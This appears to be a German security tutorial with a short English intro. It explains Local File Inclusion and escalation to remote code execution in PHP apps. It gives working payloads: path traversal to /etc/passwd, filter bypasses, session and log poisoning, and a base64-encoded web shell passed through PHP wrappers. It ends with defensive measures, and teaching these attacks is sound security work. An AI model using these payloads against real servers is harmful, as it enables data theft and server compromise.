# LFI - local file inclusion — read server files through bad input handling

**local file inclusion (LFI)** is a vulnerability in web applications where an attacker can read local files on the server through manipulated input. LFI commonly occurs in PHP applications when functions like `include`, `require`, `include_once`, or `require_once` are used insecurely. also possible in ASP, JSP, or node.js environments.

LFI typically relies on **path traversal (path manipulation)** to access system files like `/etc/passwd`. - Local File Inclusion

**Local File Inclusion (LFI)** ist eine Schwachstelle in Webanwendungen, bei der ein Angreifer durch manipulierte Eingaben lokale Dateien auf dem Server lesen kann. LFI tritt häufig in PHP-Anwendungen auf, wenn Funktionen wie `include`, `require`, `include_once` oder `require_once` unsicher verwendet werden. Sie ist jedoch auch in anderen Umgebungen wie ASP, JSP oder Node.js möglich.

LFI basiert in der Regel auf **Pfadmanipulation (Path Traversal)**, um systeminterne Dateien aufzurufen, z. B. `/etc/passwd`.

***

### 1. Einfache Einbindung über GET-Parameter

```php
<?php
    include($_GET['lang']);
?>
```

Ein Aufruf wie `?lang=EN.php` lädt die Datei `EN.php`. Ohne Validierung ist es möglich, beliebige lesbare Dateien zu referenzieren, z. B.:

```
http://webapp/index.php?lang=/etc/passwd
```

***

### 2. Verzeichnisspezifische Einbindung

```php
<?php
    include("languages/" . $_GET['lang']);
?>
```

Durch gezielte **Pfadmanipulation** lässt sich der Ordner verlassen:

```
http://webapp/index.php?lang=../../../../etc/passwd
```

***

### 3. Fehlermeldungen als Informationsquelle

Bei Blackbox-Tests können Fehlerausgaben wertvolle Informationen liefern, z. B.:

```
include(languages/xav.php): failed to open stream
```

Dies offenbart Pfadstrukturen und Dateinamensmuster (z. B. `.php` wird automatisch angehängt). Zum Umgehen dieses Anhangs kann ein **Null-Byte-Injection**-Trick versucht werden:

```
http://webapp/index.php?lang=../../../../etc/passwd%00
```

{% hint style="warning" %}
Hinweis: Seit PHP 5.3.4 ist `%00`-Injection nicht mehr wirksam.
{% endhint %}

***

### 4. Umgehung von Filtermechanismen

Filter, die z. B. `/etc/passwd` blockieren, können durch Tricks wie die **Verwendung von `/./` oder `/../` am Ende** umgangen werden:

* `/etc/passwd/.`
* `/etc/passwd/..`

Diese Tricks nutzen das Verhalten des Dateisystems aus, um Filter zu umgehen, ohne den tatsächlichen Pfad zu verändern.

***

### 5. Bypassing von Path-Sanitization

Bei Filtermechanismen, die z. B. `../` ersetzen, kann der folgende Bypass funktionieren:

```
....//....//....//etc/passwd
```

Dies umgeht einfache Ersetzungen, da sie meist nur `../` erkennen und nicht rekursiv prüfen.

***

Hier ist eine strukturierte, zusammengefasste und professionell formulierte Version des Themas **LFI2RCE – Remote Code Execution über LFI**, inklusive Session Files, Log Poisoning und PHP Wrapper:

***

## LFI2RCE – Remote Code Execution über Local File Inclusion

**LFI (Local File Inclusion)** kann weit über das bloße Auslesen von Dateien hinausgehen. Unter bestimmten Bedingungen lässt sich durch LFI sogar Remote Code Execution (RCE) erreichen. Dies geschieht durch das gezielte Einfügen und spätere Ausführen von PHP-Code in serverseitige Dateien, die von der Anwendung eingebunden werden. Zu den gängigen Methoden gehören Session File Injection, Log Poisoning sowie der Missbrauch von PHP-Wrappers.

***

### 1. **Session File Injection**

PHP speichert Sitzungsdaten standardmäßig in Dateien, z. B. unter `/var/lib/php/sessions/`. Enthält eine LFI-schwache Anwendung eine solche Session-Datei, und gelingt es dem Angreifer, zuvor schädlichen PHP-Code in seine Session zu injizieren, kann dieser ausgeführt werden.

**Vorgehensweise:**

*   Ein Angreifer sendet über den `page`-Parameter bösartigen PHP-Code:

    ```php
    <?php echo phpinfo(); ?>
    ```
* Dieser Code wird in der Session-Datei des Benutzers gespeichert.
*   Anschließend wird über eine LFI-Schwachstelle genau diese Datei eingebunden:

    ```
    /sessions.php?page=/var/lib/php/sessions/sess_[PHPSESSID]
    ```

> Hinweis: Die Session-ID ist im Browser-Cookie (`PHPSESSID`) zu finden.

***

### 2. **Log Poisoning**

**Log Poisoning** beschreibt das Einschleusen von PHP-Code in Server-Logdateien (z. B. Access Logs), gefolgt von deren Einbindung über LFI.

**Vorgehensweise:**

1.  **Code-Injektion:** Der Angreifer sendet z. B. per Netcat folgende Anfrage an den Server:

    ```bash
    $ nc 10.10.235.227 80
    <?php echo phpinfo(); ?>
    ```

    → Dieser Code wird im Apache-Log gespeichert (meist `/var/log/apache2/access.log`).
2.  **Einbindung via LFI:**

    ```php
    /vulnerable.php?page=/var/log/apache2/access.log
    ```

    → Der Server führt den Code beim Einbinden der Logdatei aus.

***

### 3. **Wrapper-basierte Codeausführung**

Neben Dateiauslese können PHP-Wrapper auch zur **Codeausführung** genutzt werden. Ein häufig verwendeter Wrapper ist:

**`php://filter` + `data://` für base64-dekodierte Payloads**

**Beispielcode:**

```php
<?php system($_GET['cmd']); echo 'Shell done!'; ?>
```

**Base64-kodiert:**`PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`

**Kombinierter Payload:**

```
php://filter/convert.base64-decode/resource=data://text/plain,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
```

**Ablauf:**

* Der Wrapper `php://filter` dekodiert die eingebetteten Daten zur Laufzeit.
* Der dekodierte Inhalt enthält PHP-Code, der dann vom Server ausgeführt wird.
*   Der Parameter `cmd` kann anschließend genutzt werden, um Befehle auszuführen, z. B.:

    ```
    ?cmd=whoami
    ```

> Achtung: Der Parameter `cmd` darf nicht im base64-kodierten Teil enthalten sein. Wird er mit enkodiert, erzeugt das eine fehlerhafte Byte-Sequenz.

***

{% hint style="info" %}
**LFI2RCE** ist ein gefährlicher Angriffsvektor, der bei unsicheren Anwendungen mit LFI-Schwachstellen zum vollständigen Serverkompromiss führen kann. Besonders kritisch sind:

* Einbindung von modifizierbaren Dateien (Sessions, Logs)
* PHP-Wrapper mit dynamischer Verarbeitung
* Fehlende oder mangelhafte Eingabevalidierung
{% endhint %}

{% hint style="info" %}
**Abwehrmaßnahmen:**

* Keine direkte Nutzung von Benutzereingaben in `include()` / `require()`
* Deaktivieren unnötiger PHP-Wrapper (`allow_url_include`, `allow_url_fopen`)
* Sicherstellung, dass sensible Dateien nicht über Webanwendungen einbindbar sind
* Logging-Verzeichnisse unzugänglich machen
* Session-Dateien nicht im einbindbaren Pfad speichern
{% endhint %}
